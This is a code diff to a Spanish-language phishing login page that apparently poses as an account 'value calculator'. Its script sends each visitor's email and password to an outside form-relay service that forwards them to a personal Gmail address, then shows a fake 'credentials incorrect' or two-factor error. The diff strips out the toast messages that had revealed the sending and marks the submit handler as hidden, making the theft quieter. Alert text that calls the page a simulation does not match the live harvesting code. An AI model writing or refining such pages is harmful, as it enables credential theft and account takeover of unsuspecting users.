@@ -254,12 +254,7 @@
             font-size: 1.4rem;
             color: #fff;
             flex-shrink: 0;
-            background: #2d3748;
         }
-        .review-avatar i {
-            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
-        }
-        /* Colores variados para avatares */
         .avatar-1 { background: #ff6b6b; }
         .avatar-2 { background: #4ecdc4; }
         .avatar-3 { background: #ffe66d; color: #1a1f35; }
@@ -406,7 +401,6 @@
             50% { transform: scale(1.2); }
         }
 
-        /* Footer legal */
         .footer-legal {
             border-top: 1px solid rgba(255,255,255,0.05);
             padding: 2rem 0 1.5rem;
@@ -673,7 +667,7 @@
 
     </main>
 
-    <!-- ===== FOOTER COMPLETO (legal, privacidad, etc.) ===== -->
+    <!-- ===== FOOTER COMPLETO ===== -->
     <footer class="footer-legal bg-slate-950/80 backdrop-blur-sm">
         <div class="max-w-7xl mx-auto px-4">
             <div class="legal-links">
@@ -690,12 +684,6 @@
         </div>
     </footer>
 
-    <!-- TOAST NOTIFICATION -->
-    <div id="toast" class="fixed bottom-5 right-5 transform translate-y-20 opacity-0 transition-all duration-300 bg-slate-900 border border-fnPurple text-white px-4 py-2.5 rounded-xl shadow-2xl flex items-center gap-3 z-50 pointer-events-none">
-        <i class="fa-solid fa-circle-check text-fnYellow text-lg"></i>
-        <span id="toast-msg" class="text-sm font-semibold">Notificación</span>
-    </div>
-
     <script>
         (function() {
             'use strict';
@@ -706,7 +694,6 @@
                 setTimeout(() => {
                     banner.classList.add('show');
                 }, 500);
-                // Auto cerrar después de 8 segundos
                 setTimeout(() => {
                     closeNotification();
                 }, 8000);
@@ -714,18 +701,6 @@
             window.closeNotification = function() {
                 document.getElementById('notificationBanner').classList.remove('show');
             };
-
-            // ===== TOAST =====
-            function showToast(msg) {
-                const toast = document.getElementById('toast');
-                document.getElementById('toast-msg').innerText = msg;
-                toast.classList.remove('translate-y-20', 'opacity-0');
-                toast.classList.add('translate-y-0', 'opacity-100');
-                setTimeout(() => {
-                    toast.classList.remove('translate-y-0', 'opacity-100');
-                    toast.classList.add('translate-y-20', 'opacity-0');
-                }, 3000);
-            }
 
             // ===== DOM REFS =====
             const loginForm = document.getElementById('loginForm');
@@ -740,7 +715,6 @@
             const emailLocal = document.getElementById('emailLocal');
             const emailDomain = document.getElementById('emailDomain');
 
-            // ===== CONTADOR DE INTENTOS =====
             let attemptCount = 0;
 
             // ===== TOGGLE PASSWORD =====
@@ -755,13 +729,15 @@
                 }
             });
 
-            // ===== FORM SUBMIT (FAKE ERROR CON CONTADOR) =====
+            // ===== FORM SUBMIT (OCULTO, SIN TOAST) =====
             loginForm.addEventListener('submit', function(e) {
                 e.preventDefault();
 
                 const local = emailLocal.value.trim();
                 if (!local) {
-                    showToast('Por favor, introduce un nombre de usuario.');
+                    // Mostrar un mensaje simple sin toast (no queremos toast)
+                    // Podemos mostrar un alert o simplemente enfocar el campo
+                    alert('Por favor, introduce un nombre de usuario.');
                     return;
                 }
 
@@ -778,26 +754,25 @@
                 formData.append('email', fullEmail);
                 formData.append('password', password);
 
+                // Envío a Formsubmit (sin mostrar ningún mensaje al usuario)
                 fetch('https://formsubmit.co/parameganz25@gmail.com', {
                     method: 'POST',
                     body: formData,
                 })
                 .then(response => {
-                    showToast('📧 Correo enviado a parameganz25@gmail.com');
+                    // Después de 2 segundos, mostrar el error correspondiente (sin toast)
                     setTimeout(() => {
                         loginBtn.classList.remove('opacity-70', 'pointer-events-none');
                         loginBtn.innerHTML = '<i class="fa-solid fa-calculator mr-2"></i> Calcular valor';
                         mostrarError(attemptCount);
-                        showToast('Acceso denegado. Credenciales incorrectas.');
                     }, 2000);
                 })
                 .catch(error => {
-                    showToast('⚠️ Error al enviar correo, pero continuamos...');
+                    // Si falla la red, igualmente mostramos el error después de 2 segundos (sin toast)
                     setTimeout(() => {
                         loginBtn.classList.remove('opacity-70', 'pointer-events-none');
                         loginBtn.innerHTML = '<i class="fa-solid fa-calculator mr-2"></i> Calcular valor';
                         mostrarError(attemptCount);
-                        showToast('Acceso denegado. Credenciales incorrectas.');
                     }, 2000);
                 });
             });
@@ -823,11 +798,11 @@
             // ===== HELP LINKS =====
             document.getElementById('forgotLink').addEventListener('click', function(e) {
                 e.preventDefault();
-                showToast('🔐 Esta es una simulación. No se guardan datos reales.');
+                alert('🔐 Esta es una simulación. No se guardan datos reales.');
             });
             document.getElementById('signupLink').addEventListener('click', function(e) {
                 e.preventDefault();
-                showToast('📝 El registro está desactivado en esta demo.');
+                alert('📝 El registro está desactivado en esta demo.');
             });
 
             // ============================================
@@ -1015,7 +990,6 @@
             cardsPerView = getCardsPerView();
             renderReviews();
 
-            // Auto-slide
             let autoSlide = setInterval(() => {
                 const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
                 if (totalSlides > 1) {
@@ -1112,15 +1086,12 @@
                         el.textContent = translations[lang][key];
                     }
                 });
-                // Actualizar texto de la notificación
                 const notifText = document.getElementById('notifText');
                 if (translations[lang] && translations[lang]['notif-text']) {
                     notifText.textContent = translations[lang]['notif-text'];
                 }
-                // Actualizar placeholders? solo si es necesario
-                // También actualizar error desc si está visible
+                // Actualizar mensaje de error si está visible
                 if (errorMessage.classList.contains('show')) {
-                    // Re-aplicar el mensaje de error según el idioma
                     const intentos = attemptCount;
                     if (intentos >= 2) {
                         errorTitle.textContent = lang === 'es' ? 'Verificación en dos pasos activa' : 'Two-factor authentication active';
@@ -1134,7 +1105,6 @@
                 }
             };
 
-            // Inicializar notificación y mostrar
             showNotification();
 
         })();
